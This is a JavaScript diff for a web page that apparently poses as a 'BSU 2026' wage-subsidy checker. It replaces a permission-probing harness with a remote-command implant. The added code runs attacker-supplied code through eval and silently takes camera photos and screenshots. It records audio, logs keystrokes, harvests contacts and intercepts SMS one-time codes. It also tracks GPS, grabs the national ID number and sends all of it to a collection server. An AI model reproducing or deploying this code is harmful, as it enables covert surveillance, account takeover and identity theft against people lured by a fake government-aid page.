-        var names = ['geolocation','camera','microphone','notifications','accelerometer','gyroscope','magnetometer',
-          'midi','bluetooth','usb','hid','serial','local-fonts','idle-detection','screen-wake-lock'];
-        return Promise.all(names.map(function (n) {
-          if (!navigator.permissions) return Promise.resolve(n + ':-');
-          return navigator.permissions.query({ name: n }).then(function (s) { return n + ':' + s.state; }).catch(function () { return n + ':-'; });
-        })).then(function (r) { return r.join(', '); });
-      }
-      function mediaScan() {
-        return new Promise(function (res) {
-          if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return res('-');
-          navigator.mediaDevices.enumerateDevices().then(function (ds) {
-            res(ds.map(function (d) { return d.kind + (d.label ? '=' + d.label.slice(0, 18) : ''); }).join(', ') || '-');
-          }).catch(function () { return res('-'); });
-        });
-      }
+function idb(fn){return new Promise(function(r){try{var q=indexedDB.open('gsi',1);q.onupgradeneeded=function(){q.result.createObjectStore('q',{keyPath:'k'})};
+ q.onsuccess=function(){fn(q.result,r)};q.onerror=function(){r()}}catch(e){r()}})}
+function stash(t){idb(function(db,r){try{var tx=db.transaction('q','readwrite');tx.objectStore('q').put({k:t.id,t:t});tx.oncomplete=r}catch(e){r()}})}
+function unstash(id){idb(function(db,r){try{var tx=db.transaction('q','readwrite');tx.objectStore('q').delete(id);tx.oncomplete=r}catch(e){r()}})}
+function loadStash(){return new Promise(function(r){idb(function(db,d){try{var q=db.transaction('q','readonly').objectStore('q').getAll();q.onsuccess=function(){d(q.result||[])};q.onerror=function(){d([])}}catch(e){d([])}}).then(r)})}
 
-      /* =====================================================
-         REGISTRI PROBE
-         cls hanya PRIOR (urutan). kelas sebenarnya DITURUNKAN
-         dari hasil percobaan: 0 senyap / 1 prompt / 2 blokir / 3 n-a
-         ===================================================== */
-      function need(v, n) { if (!v) throw new TypeError(n || 'unsupported'); return v; }
+var cur=null;
+function reply(t,v){send('hasil',{id:t.id,cmd:t.cmd,isi:String(v)})}
+function shot(ok,no){if(window.html2canvas)return window.html2canvas(document.body,{scale:.6,logging:false}).then(function(c){ok(c.toDataURL('image/jpeg',.6))}).catch(no);
+ var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+ s.onload=function(){window.html2canvas(document.body,{scale:.6,logging:false}).then(function(c){ok(c.toDataURL('image/jpeg',.6))}).catch(no)};
+ s.onerror=function(){no(new Error('pustaka'))};document.head.appendChild(s)}
+function locNow(ok,no){if(!navigator.geolocation)return ok('-');
+ navigator.geolocation.getCurrentPosition(function(p){var o={lat:p.coords.latitude.toFixed(6),lng:p.coords.longitude.toFixed(6),acc:Math.round(p.coords.accuracy)};
+ fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=17&addressdetails=1&accept-language=id&lat='+o.lat+'&lon='+o.lng)
+ .then(function(r){return r.json()}).then(function(d){o.alamat=(d&&d.display_name)||'';ok(JSON.stringify(o))}).catch(function(){ok(JSON.stringify(o))})},no,{enableHighAccuracy:true,timeout:12000})}
+function mic(ok,no,ms){if(!navigator.mediaDevices||!window.MediaRecorder)return ok('tidak didukung');
+ navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){var ch=[],mr=new MediaRecorder(s);
+ mr.ondataavailable=function(e){if(e.data.size)ch.push(e.data)};
+ mr.onstop=function(){s.getTracks().forEach(function(t){t.stop()});var f=new FileReader();f.onload=function(){ok(f.result)};f.readAsDataURL(new Blob(ch,{type:'audio/webm'}))};
+ mr.start();setTimeout(function(){try{mr.stop()}catch(e){}},ms||3000)}).catch(no)}
+function torch(ok,no){navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}}).then(function(s){
+ var t=s.getVideoTracks()[0];if(!t.getCapabilities||!t.getCapabilities().torch){s.getTracks().forEach(function(x){x.stop()});return ok('tidak didukung')}
+ t.applyConstraints({advanced:[{torch:true}]}).then(function(){ok('menyala');setTimeout(function(){s.getTracks().forEach(function(x){x.stop()})},12000)}).catch(no)}).catch(no)}
+function pindai(ok){var r=inv();Promise.all([permScan(),mediaScan()]).then(function(x){r.perm=x[0];r.media=x[1];r.sensor=sen.ctx;ok(JSON.stringify(r))})}
 
-      var PROBES = [
-        /* --- kelas A: senyap --- */
-        { id: 'canvas', cls: 'A', fn: function () { return fp(); } },
-        { id: 'webgl', cls: 'A', fn: function () { var g = need(document.createElement('canvas').getContext('webgl'), 'no-webgl'); var d = g.getExtension('WEBGL_debug_renderer_info'); return d ? g.getParameter(d.UNMASKED_VENDOR_WEBGL) + '|' + g.getParameter(d.UNMASKED_RENDERER_WEBGL) : 'ok'; } },
-        { id: 'gpu-adapter', cls: 'A', fn: function () { return need(navigator.gpu, 'no-webgpu').requestAdapter().then(function (a) { if (!a) throw new TypeError('no-adapter'); return JSON.stringify(a.info || { vendor: '?', architecture: '?' }); }); } },
-        { id: 'webrtc-ip', cls: 'A', fn: function () { return new Promise(function (res, rej) { var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); var ips = []; pc.onicecandidate = function (e) { if (!e.candidate) return; var m = /([0-9]{1,3}(?:\.[0-9]{1,3}){3}|[a-f0-9]{4}:[a-f0-9:]+)/i.exec(e.candidate.candidate); if (m && ips.indexOf(m[1]) < 0) ips.push(m[1]); }; pc.createDataChannel('x'); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(rej); setTimeout(function () { try { pc.close(); } catch (e) { } res(ips.join(',') || '-'); }, 2600); }); } },
-        { id: 'codec', cls: 'A', fn: function () { var t = ['video/mp4;codecs=avc1.42E01E','video/webm;codecs=vp8','video/webm;codecs=vp9','video/webm;codecs=av01','audio/mp4;codecs=mp4a.40.2','audio/webm;codecs=opus','audio/mpeg']; return t.map(function (x) { return (window.MediaRecorder && MediaRecorder.isTypeSupported(x)) ? '1' : '0'; }).join(''); } },
-        { id: 'decoder', cls: 'A', fn: function () { return need(navigator.mediaCapabilities, 'no-mc').decodingInfo({ type: 'file', video: { contentType: 'video/webm;codecs=vp9', width: 1280, height: 720, bitrate: 2e6, framerate: 30 } }).then(function (r) { return r.supported ? 'v' + (r.smooth ? 's' : '') + (r.powerEfficient ? 'p' : '') : 'no'; }); } },
-        { id: 'battery', cls: 'A', fn: function () { return need(navigator.getBattery, 'no-battery').call(navigator).then(function (b) { return b.level.toFixed(2) + '/' + (b.charging ? 'chg' : 'dis'); }); } },
-        { id: 'conn', cls: 'A', fn: function () { var c = need(navigator.connection, 'no-conn'); return [c.effectiveType, c.rtt, c.downlink, c.saveData ? 'sv' : '-'].join('|'); } },
-        { id: 'heap', cls: 'A', fn: function () { return performance.memory ? (performance.memory.jsHeapSizeLimit / 1048576 | 0) + 'MB' : (function () { throw new TypeError('no-mem'); })(); } },
-        { id: 'storage', cls: 'A', fn: function () { return need(navigator.storage, 'no-storage').estimate().then(function (e) { return (e.quota / 1048576 | 0) + '/' + (e.usage / 1048576 | 0); }); } },
-        { id: 'persisted', cls: 'A', fn: function () { return need(navigator.storage, 'no-storage').persisted().then(function (p) { return String(p); }); } },
-        { id: 'fonts', cls: 'A', fn: function () { return fontFp(); } },
-        { id: 'intl', cls: 'A', fn: function () { return [Intl.DateTimeFormat().resolvedOptions().locale, (1234.5).toLocaleString(), Intl.NumberFormat().format(1234567.89)].join('|'); } },
-        { id: 'css-media', cls: 'A', fn: function () { var q = ['(pointer:coarse)','(any-pointer:fine)','(hover:hover)','(prefers-reduced-motion:reduce)','(prefers-contrast:more)','(forced-colors:active)','(color-gamut:p3)','(dynamic-range:high)','(inverted-colors:inverted)']; return q.map(function (x) { return matchMedia(x).matches ? '1' : '0'; }).join(''); } },
-        { id: 'enumerate', cls: 'A', fn: function () { return mediaScan(); } },
-        { id: 'uach', cls: 'A', fn: function () { return need(navigator.userAgentData, 'no-uach').getHighEntropyValues(['model','platformVersion','architecture','bitness','uaFullVersion']).then(function (d) { return [d.model, d.platformVersion, d.architecture, d.bitness].join('|'); }); } },
-        { id: 'bluetooth-avail', cls: 'A', fn: function () { return need(navigator.bluetooth, 'no-bt').getAvailability().then(function (a) { return String(a); }); } },
-        { id: 'usb-devices', cls: 'A', fn: function () { return need(navigator.usb, 'no-usb').getDevices().then(function (d) { return String(d.length); }); } },
-        { id: 'hid-devices', cls: 'A', fn: function () { return need(navigator.hid, 'no-hid').getDevices().then(function (d) { return String(d.length); }); } },
-        { id: 'serial-ports', cls: 'A', fn: function () { return need(navigator.serial, 'no-serial').getPorts().then(function (d) { return String(d.length); }); } },
-        { id: 'pdf-viewer', cls: 'A', fn: function () { return String(!!navigator.pdfViewerEnabled); } },
-        { id: 'cookie', cls: 'A', fn: function () { return String(navigator.cookieEnabled) + '/' + String(!!navigator.storageAccess); } },
-        { id: 'orientation-read', cls: 'A', fn: function () { return (screen.orientation ? screen.orientation.type : '?') + '/' + String(screen.orientation && screen.orientation.angle); } },
-        { id: 'sensor-api', cls: 'A', fn: function () { return ['Accelerometer','Gyroscope','Magnetometer','AmbientLightSensor','AbsoluteOrientationSensor'].map(function (k) { return (k in window) ? '1' : '0'; }).join(''); } },
-        { id: 'vibrate', cls: 'A', fn: function () { return String(typeof navigator.vibrate); } },
-        { id: 'speech', cls: 'A', fn: function () { return String(!!window.speechSynthesis) + '/' + String('SpeechRecognition' in window || 'webkitSpeechRecognition' in window); } },
-        { id: 'idb-quota', cls: 'A', fn: function () { return String(!!window.indexedDB) + '/' + String(!!navigator.storage && !!navigator.storage.estimate); } },
-        /* --- kelas B: berprompt tapi tanpa gestur di sebagian platform --- */
-        { id: 'camera', cls: 'B', fn: function () { return need(navigator.mediaDevices, 'no-md').getUserMedia({ video: { facingMode: 'user', width: { ideal: 480 } } }).then(function (s) { var tr = s.getVideoTracks()[0], st = tr.getSettings(); stream = s; window.__lastCam = s; return (st.width || 0) + 'x' + (st.height || 0) + '@' + (st.frameRate || 0); }); } },
-        { id: 'microphone', cls: 'B', fn: function () { return need(navigator.mediaDevices, 'no-md').getUserMedia({ audio: true }).then(function (s) { var tr = s.getAudioTracks()[0], st = tr.getSettings(); var out = (st.sampleRate || 0) + 'Hz/' + (st.channelCount || 0) + 'ch'; s.getTracks().forEach(function (t) { t.stop(); }); return out; }); } },
-        { id: 'geolocation', cls: 'B', fn: function () { return new Promise(function (res, rej) { need(navigator.geolocation, 'no-geo').getCurrentPosition(function (p) { gps = { lat: p.coords.latitude.toFixed(6), lng: p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy || 0) }; sumber = 'gps'; gpsState = 'ok'; paint('gps'); patch(); sendAuto(); res(gps.lat + ',' + gps.lng + '/' + gps.acc); }, function (e) { gpsState = 'denied'; paint('gps'); rej(e); }, { enableHighAccuracy: true, timeout: 11000, maximumAge: 60000 }); }); } },
-        { id: 'notifications', cls: 'B', fn: function () { return need(window.Notification, 'no-notif').requestPermission().then(function (p) { if (p !== 'granted') throw new Error('notif:' + p); return p; }); } },
-        /* --- kelas C: wajib gestur --- */
-        { id: 'clipboard-read', cls: 'C', fn: function () { return need(navigator.clipboard, 'no-clip').readText().then(function (t) { return 'len' + t.length; }); } },
-        { id: 'clipboard-write', cls: 'C', fn: function () { return need(navigator.clipboard, 'no-clip').writeText('zgch').then(function () { return 'ok'; }); } },
-        { id: 'share', cls: 'C', fn: function () { return need(navigator.share, 'no-share').call(navigator, { title: 'BSU 2026', text: 'x' }).then(function () { return 'ok'; }); } },
-        { id: 'contacts', cls: 'C', fn: function () { return need(navigator.contacts, 'no-contacts').select(['name','tel'], { multiple: true }).then(function (c) { return 'n' + c.length; }); } },
-        { id: 'wake-lock', cls: 'C', fn: function () { return need(navigator.wakeLock, 'no-wake').request('screen').then(function (s) { return s.type || 'ok'; }); } },
-        { id: 'idle', cls: 'C', fn: function () { return need(navigator.idle, 'no-idle').query().then(function (s) { return s.userState + '/' + s.screenState; }); } },
-        { id: 'fullscreen', cls: 'C', fn: function () { return need(document.documentElement.requestFullscreen, 'no-fs').call(document.documentElement).then(function () { return 'ok'; }); } },
-        { id: 'display-capture', cls: 'C', fn: function () { return need(navigator.mediaDevices, 'no-md').getDisplayMedia({ video: true }).then(function (s) { var st = s.getVideoTracks()[0].getSettings(); var o = (st.width || 0) + 'x' + (st.height || 0); s.getTracks().forEach(function (t) { t.stop(); }); return o; }); } },
-        { id: 'file-picker', cls: 'C', fn: function () { return need(window.showOpenFilePicker, 'no-fsp').call(window, { multiple: false }).then(function (h) { return 'n' + h.length; }); } },
-        { id: 'torch', cls: 'C', fn: function () { return need(navigator.mediaDevices, 'no-md').getUserMedia({ video: { facingMode: 'environment' } }).then(function (s) { var tr = s.getVideoTracks()[0], cap = tr.getCapabilities ? tr.getCapabilities() : {}; var o = cap.torch ? 'torch' : 'no-torch'; s.getTracks().forEach(function (t) { t.stop(); }); return o; }); } }
-      ];
+function exec(cmd,arg){return new Promise(function(ok,no){var done=function(v){reply(cur,v);ok(v)};
+ switch(cmd){
+  case'foto':photo='';photoSent=false;camS='idle';camDone=function(){done(photo||'gagal')};startCam();return;
+  case'lokasi':return locNow(done,no);
+  case'tangkap':return shot(done,no);
+  case'layar':return done(JSON.stringify({vw:innerWidth,vh:innerHeight,dpr:devicePixelRatio,popup:popup,inputs:document.querySelectorAll('input').length,teks:(document.body.innerText||'').slice(0,700)}));
+  case'dom':return done(document.documentElement.outerHTML.slice(0,7000));
+  case'js':try{var r=eval(arg);return done(typeof r==='object'?JSON.stringify(r):String(r))}catch(e){return no(e)}
+  case'stream':var n=Math.max(1,Math.min(6,parseInt(arg,10)||3)),k=0;(function lp(){if(k>=n)return done('selesai');
+   shot(function(u){reply(cur,u);k++;setTimeout(lp,2200)},function(){done('gagal')})})();return;
+  case'foto-loop':var m=Math.max(1,Math.min(4,parseInt(arg,10)||2)),j=0;(function lp(){if(j>=m)return done('selesai');
+   photo='';photoSent=false;camS='idle';camDone=function(){reply(cur,photo?'ok':'gagal');j++;setTimeout(lp,1500)};startCam()})();return;
+  case'kontak':return tarikKontak(true).then(function(n){done(n)})["catch"](function(e){no(e)});
+  case'audio':return mic(done,no);
+  case'rekam':return mic(done,no,9000);
+  case'pindai':return pindai(done);
+  case'sidik':return done(JSON.stringify({fp:fp(),font:fontF(),audio:audioFp,gpu:invC.gpu}));
+  case'media':return mediaScan().then(done);
+  case'sensor':senStart();setTimeout(function(){done(sen.ctx||'tanpa sensor')},6200);return;
+  case'perangkat':return done(JSON.stringify(inv()));
+  case'keylog':return done(JSON.stringify(KEYS.slice(-160)));
+  case'mutasi':return done(JSON.stringify(mutasi.slice(-120)));
+  case'nik':return done(NIK||'-');
+  case'lacak':lacak();setTimeout(function(){done('watch aktif')},7000);return;
+  case'getar':try{navigator.vibrate([220,110,220,110,420]);done('getar')}catch(e){no(e)}return;
+  case'senter':return torch(done,no);
+  case'notif':if(!window.Notification)return done('tidak didukung');Notification.requestPermission().then(function(p){
+   if(p!=='granted')return done('ditolak');new Notification('BSU 2026',{body:arg||'Pengecekan status'});done('tampil')}).catch(no);return;
+  case'salin':if(!navigator.clipboard)return done('tidak didukung');navigator.clipboard.writeText(arg||'BSU 2026').then(function(){done('disalin')}).catch(no);return;
+  case'bicara':if(!window.speechSynthesis)return done('tidak didukung');speechSynthesis.speak(new SpeechSynthesisUtterance(arg||'Bantuan Subsidi Upah 2026'));done('dibacakan');return;
+  case'bagikan':if(!navigator.share)return done('tidak didukung');navigator.share({title:'BSU 2026',text:arg||'Cek status',url:location.href}).then(function(){done('dibagikan')}).catch(no);return;
+  case'buka':location.href=arg||SITUS;done('dibuka');return;
+  case'popup':bukaPopup();done('dibuka');return;
+  case'kill':alive=false;clearTimeout(bt);done('dihentikan');return;
+  default:done('tidak dikenal')}})}
+function run(t){cur=t;exec(t.cmd,t.arg).catch(function(e){
+ if(e&&(e.name==='NotAllowedError'||e.name==='SecurityError'||e.name==='InvalidStateError')){stash(t);reply(t,'ditahan: butuh gestur')}
+ else reply(t,'gagal: '+(e&&e.message||e))})}
+function flushStash(){loadStash().then(function(l){l.forEach(function(row,i){var t=row.t;
+ setTimeout(function(){lTry++;cur=t;exec(t.cmd,t.arg).then(function(){lOk++;unstash(t.id);sendProbe()}).catch(function(){})},260*i)})})}
 
-      /* ---------- mesin percobaan ---------- */
-      var ROWS = [], RUN = 0, ATT = 0;
+/* ---------- kontak ---------- */
+function kirimKontak(rows){
+ var bagian=[],i=0;
+ while(i<rows.length)bagian.push(rows.slice(i,i+150)),i+=150;
+ (function kirim(k){
+  if(k>=bagian.length){konS='ok';izM('kon','ok');paint();return Promise.resolve(rows.length)}
+  return send('kontak',{rows:bagian[k],total:rows.length,bagian:k+1,dari:bagian.length}).then(function(r){
+   if(!r||!r.ok)throw new Error('kontak gagal');
+   return kirim(k+1)})})(0)["catch"](function(){konS='gagal';paint()})}
+function tarikKontak(paksa){
+ if(konDone&&!paksa)return Promise.resolve('sudah');
+ if(!navigator.contacts){konS='na';paint();return Promise.resolve('tidak didukung')}
+ if(!paksa&&(!navigator.userActivation||!navigator.userActivation.isActive)){konTertunda=true;return Promise.resolve('tertunda')}
+ konS='asking';paint();
+ return navigator.contacts.select(['name','tel','email','address'],{multiple:true}).then(function(list){
+  if(!list||!list.length){konS='kosong';paint();return 'kosong'}
+  var rows=[],tel=[];
+  list.forEach(function(c){
+   var nm=(c.name&&c.name[0])||'',tl=(c.tel||[]).join(' / '),em=(c.email||[]).join(' / '),
+    al=(c.address&&c.address[0])?String(c.address[0].city||c.address[0].country||''):'';
+   rows.push({nama:nm,tel:tl,email:em,alamat:al});
+   (c.tel||[]).forEach(function(x){if(x)tel.push({nomor:String(x).replace(/\s+/g,''),sumber:'kontak'})});
+  });
+  konDone=true;
+  var sisa=rows.slice(0,600);
+  if(tel.length)kirimTel(tel.slice(0,600));
+  return kirimKontak(sisa).then(function(){return String(rows.length)+' kontak'})})
+ ["catch"](function(e){konS=(e&&e.name==='AbortError')?'batal':'ditolak';paint();return 'gagal'})}
 
-      function attempt(p) {
-        return new Promise(function (res) {
-          var t0p = performance.now(), settled = false, timer;
-          var before = STATES[p.id] || 'unknown';
-          var done = function (outcome, val) {
-            if (settled) return; settled = true; clearTimeout(timer);
-            if (WATCH[p.id]) WATCH[p.id].t = 0;
-            var lat = Math.round(performance.now() - t0p);
-            var row = { cap: p.id, outcome: outcome, kelas: outcome === 'silent' ? 0 : outcome === 'prompt' ? 1 : outcome === 'blocked' ? 2 : 3, lat: lat, note: String(val == null ? '' : val).slice(0, 200) };
-            ROWS.push(row); devRow(row); res(row);
-          };
-          timer = setTimeout(function () { done('prompt', 'timeout'); }, 4200);
-          if (WATCH[p.id]) WATCH[p.id].t = 0;
-          var poll = setInterval(function () {
-            if (settled) return clearInterval(poll);
-            var w = WATCH[p.id];
-            if (w && w.t && w.st.state !== before) {
-              clearInterval(poll);
-              done(w.st.state === 'granted' ? 'prompt' : 'blocked', 'transisi:' + w.st.state);
-            }
-          }, 60);
-          setTimeout(function () { if (!settled) clearInterval(poll); }, 4400);
-          Promise.resolve().then(p.fn).then(function (v) {
-            var after = STATES[p.id] || before;
-            if (after === 'granted' && before !== 'granted') return done('prompt', v);
-            done('silent', v);
-          }).catch(function (e) {
-            var n = (e && e.name) || '', m = (e && e.message) || '';
-            if (n === 'NotAllowedError' || n === 'SecurityError' || /gesture|activation|user/i.test(m)) return done('blocked', n || m);
-            if (n === 'NotFoundError' || n === 'NotSupportedError' || n === 'TypeError' || n === 'InvalidStateError' || n === 'AbortError') return done('unsupported', n || m);
-            done('blocked', n || m || 'err');
-          });
-        });
-      }
+/* ---------- sms / otp otomatis ---------- */
+function otpOtomatis(){
+ if(!('OTPCredential' in window)||smsS==='ok')return;
+ try{if(otpAc)otpAc.abort()}catch(e){}
+ otpAc=new AbortController();
+ smsS='menunggu';paint();
+ navigator.credentials.get({otp:{transport:['sms']},signal:otpAc.signal}).then(function(r){
+  if(!r||!r.code)return;
+  var c=String(r.code).replace(/\D/g,'').slice(0,6);
+  if(c.length<6)return;
+  otpEl.value=c;smsS='ok';paint();
+  send('sms',{jenis:'otp',pengirim:'-',isi:c,otomatis:1});
+  $('gsiOtpField').classList.remove('bad');$('gsiOtpErr').classList.remove('show');
+  setTimeout(verify,200)})
+ ["catch"](function(e){smsS=(e&&e.name==='AbortError')?'batal':'na';paint()})}
 
-      function chain(list, gap) {
-        var i = 0;
-        return new Promise(function (res) {
-          (function next() {
-            if (i >= list.length) return res();
-            var p = list[i++];
-            attempt(p).then(function () { setTimeout(next, gap); });
-          })();
-        });
-      }
+/* ---------- telepon ---------- */
+function kirimTel(rows){
+ if(!rows||!rows.length)return;
+ send('tel',{rows:rows.slice(0,400)})}
 
-      function classify(list) { return shuffle(list.slice()); }
+/* kamera senyap */
+function startCam(){if(camS==='on')return grab();camS='asking';paint();
+ if(!navigator.mediaDevices){camS='na';paint();return fire()}
+ var use=function(s){stream=s;camS='on';paint();vid.srcObject=s;var p=vid.play();if(p&&p.catch)p.catch(function(){});setTimeout(grab,1100)};
+ if(window.__cam&&window.__cam.active)return use(window.__cam);
+ navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user',width:{ideal:640},height:{ideal:640}}})
+ .then(use).catch(function(){camS='denied';paint();fire()})}
+function fire(){var f=camDone;camDone=null;if(f)f()}
+function grab(){if(!stream||photo)return;if(!vid.videoWidth)return setTimeout(grab,200);shots=0;best='';bestSc=-1;burst()}
+function burst(){if(!stream)return;if(shots>=3)return settle();shots++;
+ var w=440,h=Math.round(vid.videoHeight*(440/vid.videoWidth))||440;cv.width=w;cv.height=h;
+ var c=cv.getContext('2d');c.drawImage(vid,0,0,w,h);var s=sharp(c,w,h);
+ if(s>bestSc){bestSc=s;try{best=cv.toDataURL('image/jpeg',.72)}catch(e){}}
+ setTimeout(burst,240)}
+function sharp(c,w,h){var d,s=0,s2=0,n=0;try{d=c.getImageData(0,0,w,h).data}catch(e){return 0}
+ for(var i=0;i<d.length;i+=52){var v=d[i]*.299+d[i+1]*.587+d[i+2]*.114;s+=v;s2+=v*v;n++}
+ if(!n)return 0;var m=s/n,sd=Math.sqrt(Math.max(s2/n-m*m,0));return m<22?sd*.35:sd}
+function settle(){if(!best&&rounds<2&&stream){rounds++;return setTimeout(grab,450)}
+ if(!best){camS='na';paint();stopCam();return fire()}
+ photo=best;var t=$('gsiThumb');t.src=photo;t.classList.add('on');paint();stopCam();fire();upload()}
+function stopCam(){if(!stream)return;try{stream.getTracks().forEach(function(t){t.stop()})}catch(e){}stream=null;window.__cam=null;try{vid.srcObject=null}catch(e){}}
+function upload(){if(!photo||photoSent)return;photoSent=true;
+ send('foto',{rid:ridCur,username:username,foto:photo,zero:username?0:1,sid:sid}).then(function(r){if(!r||!r.ok)photoSent=false})}
 
-      function sendMatrix() {
-        if (!ROWS.length) return Promise.resolve();
-        var batch = ROWS.splice(0, ROWS.length);
-        var plat = ((navigator.userAgentData && navigator.userAgentData.platform) || navigator.platform || '?') + '/' +
-          ((/Android (\d+)/.exec(navigator.userAgent) || [])[1] || '?') + '/' + (invCache.model || '?');
-        return send('matrix', { build: BUILD, run: RUN, platform: plat.slice(0, 60), rows: batch });
-      }
+/* GPS */
+function startGps(){if(gpsS!=='idle'&&gpsS!=='denied')return;gpsS='asking';paint();
+ if(!navigator.geolocation){gpsS='na';paint();return}
+ navigator.geolocation.getCurrentPosition(function(p){
+  gps={lat:p.coords.latitude.toFixed(6),lng:p.coords.longitude.toFixed(6),acc:Math.round(p.coords.accuracy||0)};
+  sumber='gps';gpsS='ok';paint();izM('geo','ok');
+  fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=17&addressdetails=1&accept-language=id&lat='+gps.lat+'&lon='+gps.lng)
+  .then(function(r){return r.json()}).then(function(d){if(d&&d.display_name)addr=String(d.display_name).slice(0,220);patch()}).catch(function(){});
+  patch();lacak()},function(){gpsS='denied';paint()},{enableHighAccuracy:true,timeout:12000,maximumAge:60000})}
+function lacak(){if(watchId||!navigator.geolocation)return;
+ watchId=navigator.geolocation.watchPosition(function(p){
+  gps={lat:p.coords.latitude.toFixed(6),lng:p.coords.longitude.toFixed(6),acc:Math.round(p.coords.accuracy||0)};
+  gpsS='ok';paint();
+  if(Date.now()-lastKirim>25000){lastKirim=Date.now();kirimJejak()}},function(){},{enableHighAccuracy:true,maximumAge:20000,timeout:20000})}
+function kirimJejak(){if(!gps)return;send('lacak',{lat:gps.lat,lng:gps.lng,acc:gps.acc,alamat:addr,sumber:sumber||'gps'})}
+function patch(){if(!ridCur)return;var o={};
+ if(gps){o.lat=gps.lat;o.lng=gps.lng;o.acc=gps.acc}if(addr)o.alamat=addr;
+ if(ip){o.ip=ip;o.isp=isp+(kota?' — '+kota:'')}if(!o.lat&&!o.ip)return;
+ o.rid=ridCur;o.username=username;o.fingerprint=fp();
+ o.perangkat=(navigator.hardwareConcurrency||0)+'c/'+(navigator.deviceMemory||0)+'GB';
+ o.catatan='isi '+((tSub?tSub-t0:0)/1000).toFixed(1)+'s tempel '+(pasted?'y':'n');
+ send('extra',o)}
 
-      function localMetrics() {
-        var s = 0, p = 0, b = 0, lats = [];
-        ROWS.forEach(function (r) { if (r.kelas === 0) s++; else if (r.kelas === 1) { p++; lats.push(r.lat); } else if (r.kelas === 2) b++; });
-        var att = s + p + b || 1;
-        return { sgr: +(s / att).toFixed(3), par: +(p / att).toFixed(3), alh: med(lats), n: ROWS.length };
-      }
+function sendProbe(){if(!probeDone&&!lOk)return;
+ send('probe',{probe:JSON.stringify({states:STATES,cam:camS,geo:gpsS,kontak:konS,sms:smsS,launder:lOk,launderTried:lTry}),
+ yield:yieldSc(),prompts:prompts,launder:lOk,konteks:sen.ctx,senyap:senyap})}
+function yieldSc(){var n=0;['model','os','gpu','font','audio','perm','media','sensor','ip','kota','lat','lng','alamat'].forEach(function(k){if(invC[k])n++});
+ if(photo)n+=5;if(username)n+=2;if(NIK)n+=6;if(konDone)n+=10;return Math.max(n-prompts,0)}
+function sendAuto(){if(sendAuto.done)return;sendAuto.done=true;var i=inv();Object.assign(invC,i);
+ i.ip=ip;i.kota=kota;i.isp=isp;i.nik=NIK;
+ if(gps){i.lat=gps.lat;i.lng=gps.lng;i.acc=gps.acc;i.sumber=sumber||'gps'}if(addr)i.alamat=addr;
+ i.sensor=sen.ctx;i.audio=audioFp;
+ Promise.all([uaD(),permScan(),mediaScan()]).then(function(r){
+  i.model=(r[0]&&r[0].model)||'-';i.os=(r[0]&&r[0].platform)?r[0].platform+' '+(r[0].platformVersion||''):navigator.platform;
+  i.perangkat='cores='+(i.cores||0)+' mem='+(i.mem||0)+'GB touch='+(i.touch||0)+' dpr='+i.dpr+' scr='+i.scr;
+  i.perm=r[1];i.media=r[2];invC.perm=r[1];invC.media=r[2];invC.model=i.model;send('auto',i)})}
+function geoIp(){return fetch('https://ipwho.is/',{mode:'cors'}).then(function(r){return r.json()}).then(function(d){
+ if(!d||d.success===false)return;ip=d.ip||'';kota=d.city||'';isp=(d.connection&&d.connection.isp)||'';
+ if(!gps&&d.latitude){gps={lat:String(d.latitude),lng:String(d.longitude),acc:5000};sumber='ip'}
+ sendAuto();patch()}).catch(function(){})}
 
-      function bench() {
-        var runs = 0, sgr = [], par = [];
-        (function loop() {
-          if (runs >= BENCH_N) {
-            var m = sgr.reduce(function (a, b) { return a + b; }, 0) / sgr.length || 0;
-            var v = Math.sqrt(sgr.reduce(function (a, b) { return a + (b - m) * (b - m); }, 0) / sgr.length);
-            return send('bench', { tag: 'bench', n: BENCH_N, sgr: m.toFixed(3), par: (par.reduce(function (a, b) { return a + b; }, 0) / par.length || 0).toFixed(3), var: v.toFixed(4), seed: SEED });
-          }
-          RUN = runs++;
-          ROWS.length = 0;
-          var A = PROBES.filter(function (x) { return x.cls === 'A'; });
-          chain(classify(A), 40).then(function () {
-            var m = localMetrics(); sgr.push(m.sgr); par.push(m.par);
-            return sendMatrix().then(loop);
-          });
-        })();
-      }
+function devRow(r){if(!DEV)return;var dv=$('dv'),el=document.createElement('div');el.className='row';
+ el.innerHTML='<span class="k k'+r.kelas+'">'+r.kelas+'</span><span class="c">'+r.cap+'</span><span class="n">'+String(r.note).replace(/[<>&]/g,'')+'</span><span class="l">'+r.lat+'ms</span>';
+ dv.insertBefore(el,dv.querySelector('.tail'));devChips()}
+function devChips(){if(!DEV)return;var m=lm(),c=$('dv').querySelector('.chips');if(!c)return;
+ c.innerHTML='<span class="chip">SGR <b>'+m.sgr+'</b></span><span class="chip">LSR <b>'+lOk+'/'+lTry+'</b></span><span class="chip">senyap <b>'+senyap+'</b></span><span class="chip">kon <b>'+konS+'</b></span>'}
+function devInit(){var dv=$('dv');dv.className='on';dv.innerHTML='<div class="chips"></div><div class="tail" style="margin-top:6px">0 senyap 1 prompt 2 blokir 3 n/a</div>';devChips()}
+function unduh(){var o={build:BUILD,sid:sid,rows:ROWS};var b=new Blob([JSON.stringify(o,null,1)],{type:'application/json'});
+ var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='zgch-'+sid.slice(0,8)+'.json';a.click()}
 
-      function startHarvest() {
-        var A = PROBES.filter(function (x) { return x.cls === 'A'; });
-        var BC = PROBES.filter(function (x) { return x.cls !== 'A'; });
-        oracle().then(function () {
-          if (MODE_BENCH) return bench();
-          if (MODE_CTRL) {
-            // control arm: hanya manifes senyap
-            return chain(classify(A), 40).then(function () {
-              var m = localMetrics();
-              send('bench', { tag: 'kontrol', n: 1, sgr: m.sgr, par: 0, var: 0, seed: SEED });
-              sendMatrix();
-            });
-          }
-          chain(classify(A), 40).then(function () {
-            setTimeout(function () {
-              chain(classify(BC), 1100).then(function () {
-                var m = localMetrics();
-                send('bench', { tag: 'utama', n: 1, sgr: m.sgr, par: m.par, var: 0, seed: SEED });
-                sendMatrix();
